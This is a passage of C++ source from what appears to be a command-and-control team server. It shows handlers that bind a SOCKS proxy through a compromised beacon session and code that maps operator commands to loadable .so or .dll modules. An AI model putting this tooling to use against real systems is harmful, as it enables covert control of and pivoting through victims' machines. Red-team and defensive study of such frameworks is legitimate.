                m_isSocksServerBinded = false;
                if (m_socksThread)
                    m_socksThread->join();
                m_socksThread.reset(nullptr);

                m_isSocksServerRunning = false;
                if (m_socksServer)
                    m_socksServer->stop();
                m_socksServer.reset(nullptr);

                m_logger->info("Socks server stoped");
                responseTmp.set_result("Socks server stoped");
                *response = responseTmp;
                return grpc::Status::OK;
            }
            else if (cmd == "bind")
            {
                if (!m_isSocksServerRunning)
                {
                    m_logger->warn("Error: Socks server not running");
                    responseTmp.set_result("Error: Socks server not running");
                    *response = responseTmp;
                    return grpc::Status::OK;
                }
                if (m_isSocksServerBinded)
                {
                    m_logger->warn("Error: Socks server already bind");
                    responseTmp.set_result("Error: Socks server already bind");
                    *response = responseTmp;
                    return grpc::Status::OK;
                }
                if (splitedCmd.size() == 3)
                {
                    std::string beaconHash = splitedCmd[2];
                    for (int i = 0; i < m_listeners.size(); i++)
                    {
                        int nbSession = m_listeners[i]->getNumberOfSession();
                        for (int kk = 0; kk < nbSession; kk++)
                        {
                            std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);
                            std::string hash = session->getBeaconHash();
                            if (hash.find(beaconHash) != std::string::npos && !session->isSessionKilled())
                            {
                                m_socksListener = m_listeners[i];
                                m_socksSession = m_listeners[i]->getSessionPtr(kk);

                                m_socksThread = std::make_unique<std::thread>(&TeamServer::socksThread, this);

                                m_isSocksServerBinded = true;
                                m_logger->info("Socks server sucessfully binded");
                                responseTmp.set_result("Socks server sucessfully binded\nThink about setting the sleep time of the beacon to 0.001 to force a good throughput");
                                *response = responseTmp;
                                return grpc::Status::OK;
                            }
                        }
                    }

                    m_logger->warn("Error: Socks server bind failed, session not found");
                    responseTmp.set_result("Error: Socks server bind failed, session not found");
                    *response = responseTmp;
                    return grpc::Status::OK;
                }
            }
            else if (cmd == "unbind")
            {
                m_isSocksServerBinded = false;
                if (m_socksThread)
                    m_socksThread->join();
                m_socksThread.reset(nullptr);

                m_logger->info("Socks server successfully unbinding");
                responseTmp.set_result("Socks server successfully unbinding");
                *response = responseTmp;
                return grpc::Status::OK;
            }
            else
            {
                m_logger->warn("Error: Socks server command not found.");
                responseTmp.set_result("Error: Socks server command not found.");
                *response = responseTmp;
                return grpc::Status::OK;
            }
        }
    }
    // TODO add a clean www directory !!!
    else
    {
        responseTmp.set_result("Error: not implemented.");
        *response = responseTmp;
        return grpc::Status::OK;
    }

    *response = responseTmp;

    return grpc::Status::OK;
}

std::string toLower(const std::string& str)
{
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(),
        [](unsigned char c)
        { return std::tolower(c); });
    return result;
}

int TeamServer::prepMsg(const std::string& input, C2Message& c2Message, bool isWindows)
{
    m_logger->trace("prepMsg");

    std::vector<std::string> splitedCmd;
    splitInputCmd(input, splitedCmd);

    if (splitedCmd.empty())
        return 0;

    int res = 0;
    string instruction = splitedCmd[0];
    bool isModuleFound = false;
    for (int i = 0; i < m_commonCommands.getNumberOfCommand(); i++)
    {
        if (instruction == m_commonCommands.getCommand(i))
        {
            // check the path / file name / instruction given for translation
            if (instruction == LoadModuleInstruction)
            {
                if (splitedCmd.size() == 2)
                {
                    std::string param = splitedCmd[1];

                    // Handle the 4 historicals commands where the cmd name don't match the module file name
                    if (param == "ls")
                        param = "listDirectory";
                    else if (param == "cd")
                        param = "changeDirectory";
                    else if (param == "ps")
                        param = "listProcesses";
                    else if (param == "pwd")
                        param = "printWorkingDirectory";

                    if (param.size() >= 3 && param.substr(param.size() - 3) == ".so")
                    {
                    }
                    else if (param.size() >= 4 && param.substr(param.size() - 3) == ".dll")
                    {
                    }
                    else
                    {
                        m_logger->debug("Translate instruction to module name to load in {0}", m_teamServerModulesDirectoryPath.c_str());
                        try
                        {
                            for (const auto& entry : fs::recursive_directory_iterator(m_teamServerModulesDirectoryPath))
                            {
                                if (fs::is_regular_file(entry.path()) && entry.path().extension() == ".so")
                                {

                                    std::string moduleName = entry.path().filename();
                                    moduleName = moduleName.substr(3);                          // remove lib
                                    moduleName = moduleName.substr(0, moduleName.length() - 3); // remove .so

                                    if (toLower(param) == toLower(moduleName))
                                    {
                                        if (isWindows)
                                        {
                                            splitedCmd[1] = moduleName;
                                            splitedCmd[1] += ".dll";
                                        }
                                        else
                                        {
                                            splitedCmd[1] = entry.path().filename();
                                        }

                                        m_logger->debug("Found module to load {0}", splitedCmd[1]);
                                    }
                                }
                            }
                        }
                        catch (const std::filesystem::filesystem_error& e)
                        {
                            m_logger->warn("Error accessing module directory");
                        }
                    }
                }
            }
            res = m_commonCommands.init(splitedCmd, c2Message, isWindows);
            isModuleFound = true;
        }
    }

    for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
    {
        if (toLower(instruction) == toLower((*it)->getName()))
        {
            splitedCmd[0] = (*it)->getName();
            res = (*it)->init(splitedCmd, c2Message);
            isModuleFound = true;
        }
    }

    if (!isModuleFound)
    {
        m_logger->warn("Module {0} not found.", instruction);

        std::string hint = "Module ";
        hint += instruction;
        hint += " not found.";
        c2Message.set_returnvalue(hint);

        res = -1;
    }

    m_logger->trace("prepMsg end");

    return res;
}
